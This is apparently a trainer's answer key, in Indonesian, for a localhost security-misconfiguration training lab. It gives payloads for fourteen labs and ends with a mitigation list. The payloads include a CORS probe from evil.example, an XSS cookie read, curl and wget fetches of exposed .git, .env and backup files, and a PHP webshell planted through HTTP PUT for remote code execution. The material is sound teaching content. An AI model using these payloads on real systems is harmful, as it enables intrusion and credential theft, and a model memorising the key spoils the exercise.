# Kunci Jawaban — Security Misconfiguration Lab

> 📌 **Untuk trainer/pendamping.** Jangan dibagikan ke peserta sebelum sesi selesai.

---

## Lab 1 — Debug mode / stack trace bocor (`lab1_debug_stacktrace.php`)
**Kode:** `define('DEBUG_MODE', true)`, exception dilempar saat `is_numeric($id)` gagal, lalu
karena `DEBUG_MODE` true, `$e->getMessage()` dan trace dicetak mentah ke halaman.
**Payload:** masukkan `abc` (atau nilai non-angka apa pun) ke kolom Product ID.
**Kenapa berhasil:** mode debug yang seharusnya hanya aktif di environment development tertinggal
menyala di production. Aplikasi menampilkan pesan error asli (termasuk connection string
database) alih-alih pesan generik.
**Hasil:** connection string database production bocor lengkap:
`mysql:host=db-prod.internal;dbname=shop_prod;user=shop_app;password=Pr0d_DbP4ss_2024!`.

---

## Lab 2 — Kredensial default (`lab2_default_credentials.php`)
**Payload:** username `admin`, password `admin123`.
**Kenapa berhasil:** kredensial bawaan installer/vendor tidak pernah diganti sebelum go-live —
komentar HTML (`<!-- TODO: ganti kredensial default admin/admin123 sebelum go-live -->`) yang
terlihat di view-source bahkan mengonfirmasi ini adalah utang teknis yang diketahui tapi tidak
pernah diselesaikan.
**Hasil:** login berhasil ke "Admin Dashboard", membocorkan daftar email seluruh user terdaftar.

---

## Lab 3 — Directory listing (`lab3_directory_listing.php`)
**Payload:** buka `/secmisconfig/backup/`.
**Kenapa berhasil:** direktori `backup/` dikonfigurasi dengan `Options +Indexes` di Apache
(`apache/backup_listing.conf`), sehingga Apache menampilkan daftar seluruh file di dalamnya
tanpa perlu tahu nama file spesifik.
**Hasil:** `db_backup_2024.sql.bak` dan `config.php.bak` bisa dibuka langsung — keduanya
membocorkan password database yang sama (`Adm1n_S3cret_2024`), mengonfirmasi validitas
kredensial tersebut lewat dua sumber independen.

---

## Lab 4 — Endpoint debug terlupakan (`lab4_debug_endpoint.php`)
**Payload:** akses langsung `http://localhost:8079/secmisconfig/lab4_debug_endpoint.php`
(tidak ada di navigasi manapun, hanya bisa ditemukan lewat wordlist/URL guessing atau kalau
sudah tahu dari sumber lain).
**Kenapa berhasil:** endpoint debug internal yang dipakai developer saat development tertinggal
di production, tidak dihapus dan tidak dilindungi autentikasi. "Tidak ditautkan di menu" bukan
kontrol akses (security by obscurity) — URL tetap dapat diakses siapa saja yang mengetahuinya.
**Hasil:** versi PHP, document root, dan "environment variables" (password database, AWS secret
key, JWT signing key, secret key payment gateway) semuanya terekspos di satu halaman publik.

---

## Lab 5 — CORS misconfiguration (`lab5_cors_misconfig.php`)
**Kode:** `header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']); header('Access-Control-Allow-Credentials: true');`
**Payload:** `curl -i -H "Origin: https://evil.example" ".../lab5_cors_misconfig.php?action=api"`,
atau `fetch(url, {credentials:'include'}).then(r=>r.json()).then(console.log)` dari console
browser di origin lain.
**Kenapa berhasil:** server me-reflect nilai header `Origin` apa pun yang dikirim client ke
`Access-Control-Allow-Origin` tanpa validasi allowlist, sekaligus mengizinkan
`Access-Control-Allow-Credentials: true` — kombinasi ini membuat browser di origin mana pun
diizinkan membaca response yang berisi data user yang sedang login (lewat cookie session yang
otomatis terkirim).
**Hasil:** response `curl`/`fetch` mengembalikan `email` dan `api_key` milik user yang sedang
login, terlihat oleh origin yang sama sekali bukan aplikasi resmi.

---

## Lab 6 — Header keamanan hilang / Clickjacking (`lab6_missing_headers_clickjacking.php`)
**Kode:** halaman ini tidak mengirim `X-Frame-Options` maupun
`Content-Security-Policy: frame-ancestors` sama sekali.
**Langkah:** buka `lab6_attacker_iframe.php` (halaman simulasi attacker), klik tombol umpan
"Klaim Hadiah" yang secara visual menutupi tombol "Konfirmasi Transfer" asli yang disembunyikan
di dalam iframe (`opacity` mendekati nol) tepat di bawahnya, lalu kembali ke
`lab6_missing_headers_clickjacking.php`.
**Kenapa berhasil:** tanpa `X-Frame-Options`/`frame-ancestors`, browser mengizinkan halaman
tersebut di-embed di iframe milik domain lain. Attacker menumpuk iframe yang disembunyikan di
bawah UI umpan sehingga klik yang dimaksudkan korban untuk hal lain ("klaim hadiah") sebenarnya
jatuh tepat di tombol submit form transfer di halaman asli.
**Hasil:** entri transfer baru muncul di tabel Log Transfer, dibuat tanpa korban pernah benar-benar
bermaksud menekan tombol "Konfirmasi Transfer".

---

## Lab 7 — Folder .git ter-expose (`lab7_git_exposed.php`)
**Payload:**
```bash
curl -s http://localhost:8079/secmisconfig/vcs-demo/.git/HEAD
mkdir -p recon && cd recon
wget -q -r -np -nH --cut-dirs=2 -R "index.html*" http://localhost:8079/secmisconfig/vcs-demo/.git/
git log --all -p
```
**Kenapa berhasil:** subsite `vcs-demo/` di-deploy dengan menyalin seluruh folder kerja git apa
adanya, termasuk `.git/`. Directory listing aktif di folder ini (`vcs_demo_indexes.conf`)
sehingga seluruh isi `.git/objects/` bisa diunduh tanpa tool khusus.
**Hasil:** riwayat commit terbaca lengkap, termasuk diff commit "WIP: nyimpen config db buat
testing" yang menunjukkan isi `config-secret.txt` (`DB_PASSWORD=Gr4nma_Git_Hist0ry_Le4k_2024!`)
walau file itu sudah "dihapus" di commit berikutnya dan tidak ada lagi di `vcs-demo/` saat ini.

---

## Lab 8 — File .env ter-expose (`lab8_env_exposed.php`)
**Payload:** `curl -s http://localhost:8079/secmisconfig/.env`
**Kenapa berhasil:** file `.env` ikut ter-deploy di root aplikasi, dan tidak ada aturan yang
memblokir akses ke dotfile.
**Hasil:** `DB_PASSWORD=Env_File_Le4k_2024!`, `MAIL_PASSWORD=Sm7p_M4il_2024!`, dan `APP_KEY`
terbaca mentah-mentah.

---

## Lab 9 — Backup file editor yang bisa ditebak (`lab9_backup_file_guess.php`)
**Payload:** `curl -s http://localhost:8079/secmisconfig/config.php.save`
**Kenapa berhasil:** file recovery editor (`.save`) tertinggal di webroot; karena ekstensinya
bukan `.php`, Apache mengirimnya sebagai teks biasa alih-alih mengeksekusinya.
**Hasil:** source code `config.php` asli terbaca lengkap dengan
`$db_pass = 'Backup_File_Le4k_2024!'`.

---

## Lab 10 — Cookie tanpa flag HttpOnly (`lab10_missing_httponly.php`)
**Kode:** `setcookie($name, $token, ['httponly' => false, ...])`.
**Payload:** `lab10_missing_httponly.php?msg=<script>document.title=document.cookie</script>`
**Kenapa berhasil:** tanpa `HttpOnly`, `document.cookie` bisa membaca cookie
`demo_session_httponly_off` — bug XSS reflected yang disediakan di halaman yang sama langsung
membuktikan dampaknya.
**Hasil:** judul tab browser berubah menampilkan nilai cookie sesi secara utuh.

---

## Lab 11 — Cookie tanpa flag Secure (`lab11_missing_secure.php`)
**Kode:** `setcookie($name, $token, ['secure' => false, ...])`.
**Payload:** klik "Akses endpoint legacy (simulasi plain HTTP)" (`?legacy_http_endpoint=1`).
**Kenapa berhasil:** tanpa `Secure`, browser tidak dibatasi hanya mengirim cookie lewat HTTPS —
endpoint "legacy" simulasi tetap menerima cookie yang identik.
**Hasil:** nilai cookie sesi yang sama terbaca lagi di endpoint simulasi, membuktikan tidak ada
jaminan cookie ini hanya melintas lewat koneksi terenkripsi.

---

## Lab 12 — Cookie tanpa atribut SameSite (`lab12_missing_samesite.php`)
**Kode:** `setcookie($name, $token, ['httponly' => true, 'secure' => false])` — parameter
`samesite` tidak disertakan sama sekali.
**Payload:** `curl -i http://localhost:8079/secmisconfig/lab12_missing_samesite.php | grep -i set-cookie`
**Kenapa berhasil:** atribut `SameSite` tidak dideklarasikan eksplisit. Browser modern (Chrome
80+/Firefox 96+) memang menerapkan default `Lax` diam-diam, tapi browser lama/WebView tetap
memperlakukannya sebagai `None` (dikirim di semua request lintas situs).
**Hasil:** header `Set-Cookie` terbukti tidak memuat atribut `SameSite` sama sekali, berbeda dari
Lab 10/11 yang eksplisit `SameSite=Lax`.

---

## Lab 13 — HTTP method TRACE aktif / XST (`lab13_trace_method.php`)
**Payload:**
```bash
curl -v -X TRACE http://localhost:8079/secmisconfig/lab13_trace_method.php \
  -H "X-Rahasia-Demo: nilai-ini-seharusnya-tidak-terlihat-siapa-pun"
```
**Kenapa berhasil:** image dasar (Debian) sebenarnya sudah mematikan `TRACE` secara default
(`TraceEnable Off` di `security.conf` bawaan) — tapi konfigurasi server ini secara eksplisit
membalikkannya jadi `TraceEnable On`, mensimulasikan sysadmin yang mengaktifkannya lagi untuk
debugging dan lupa mematikannya. Dengan `TraceEnable On`, Apache kembali menjalankan perilaku
lama method `TRACE`: meng-echo seluruh request kembali di body response.
**Hasil:** body response memuat persis header `X-Rahasia-Demo` yang dikirim (dan akan memuat
header `Cookie` juga kalau dikirim) — celah historis untuk melewati proteksi `HttpOnly` lewat
XMLHttpRequest browser lama (Cross-Site Tracing).

---

## Lab 14 — HTTP method PUT diterima tanpa validasi (`lab14_put_method.php`)
**Kode:** `if ($_SERVER['REQUEST_METHOD'] === 'PUT') { file_put_contents($upload_dir . '/' . basename($_GET['file']), file_get_contents('php://input')); }`
— tanpa validasi ekstensi/isi/autentikasi apa pun, disimpan ke direktori yang tetap dieksekusi
PHP oleh Apache.
**Payload:**
```bash
printf '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X PUT --data-binary @shell.php "http://localhost:8079/secmisconfig/lab14_put_method.php?file=shell.php"
curl "http://localhost:8079/secmisconfig/data/put_uploads/shell.php?cmd=id"
```
**Kenapa berhasil:** endpoint memproses method `PUT` dan menyimpan body request apa adanya —
attack surface ini sama sekali tidak melewati form upload aplikasi (yang mungkin sudah divalidasi
ketat di kategori File Upload), karena PHP tetap memproses request PUT yang sampai ke script
selama tidak ada `<LimitExcept>`/pembatas method eksplisit.
**Hasil:** output `id` (uid/gid proses Apache) berhasil dieksekusi lewat webshell yang ditanam
murni lewat HTTP method PUT — Remote Code Execution penuh.

---

## Ringkasan hasil akhir

| Lab | Teknik | Bukti keberhasilan |
|---|---|---|
| 1 | Mode debug aktif di production | Password database production bocor di pesan error |
| 2 | Kredensial default tidak diganti | Login admin berhasil, data user terbaca |
| 3 | Directory listing aktif | Isi file backup (password DB) terbaca |
| 4 | Endpoint debug tidak dihapus/dilindungi | Kredensial cloud & JWT signing key terekspos |
| 5 | CORS reflect origin + credentials | Data pribadi user lintas-origin terbaca |
| 6 | Header X-Frame-Options/CSP tidak ada | Transfer dana terjadi tanpa sepengetahuan korban |
| 7 | Folder .git ter-expose | Secret di riwayat git yang "sudah dihapus" terbaca |
| 8 | File .env ter-expose | Kredensial production plaintext terbaca |
| 9 | Backup file editor bisa ditebak | Source code + kredensial DB terbaca sebagai teks biasa |
| 10 | Cookie tanpa HttpOnly | Cookie sesi terbaca lewat document.cookie (via XSS) |
| 11 | Cookie tanpa Secure | Cookie sesi tetap terkirim ke endpoint plain HTTP |
| 12 | Cookie tanpa SameSite | Atribut SameSite terbukti tidak ada di Set-Cookie |
| 13 | HTTP TRACE aktif | Header request (termasuk custom header) di-echo balik |
| 14 | HTTP PUT diterima tanpa validasi | Webshell tertanam & RCE lewat method PUT |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Matikan mode debug di production; log detail error hanya ke server, bukan ke response.
- Ganti semua kredensial default sebelum go-live.
- Nonaktifkan directory listing dan jangan taruh file sensitif di dalam webroot.
- Hapus/lindungi endpoint debug sebelum deploy.
- Terapkan allowlist origin yang ketat untuk CORS; jangan gabungkan reflect-origin dengan
  `Access-Control-Allow-Credentials: true`.
- Pasang `X-Frame-Options` dan `Content-Security-Policy: frame-ancestors` di semua respons.
- Jangan pernah men-deploy `.git`/`.env`/file backup editor ke webroot production; blokir akses
  dotfile secara eksplisit di konfigurasi web server.
- Pasang `HttpOnly`, `Secure`, dan `SameSite` secara eksplisit di setiap cookie sesi.
- Matikan `TRACE` dan batasi method HTTP yang diterima tiap endpoint.
